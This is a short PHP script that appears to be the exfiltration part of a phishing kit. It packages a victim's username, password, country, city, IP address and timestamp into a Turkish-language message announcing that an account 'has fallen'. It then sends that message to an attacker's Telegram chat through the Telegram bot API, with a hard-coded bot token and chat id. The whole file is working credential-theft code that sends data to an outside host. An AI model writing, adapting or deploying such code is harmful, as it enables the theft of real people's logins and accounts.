<?php
    $token='1816063393:AAGDppFfhGsQ08I2J3VoXwQXbAx3R6l0rvo';
    $data = [
        'text' => 'KAAN BABA HESAP DÜŞTÜ

Kullanıcı Adı : '.$kaan.'
Şifre : '.$password.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
      ',
      'chat_id' => '1875896657'
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>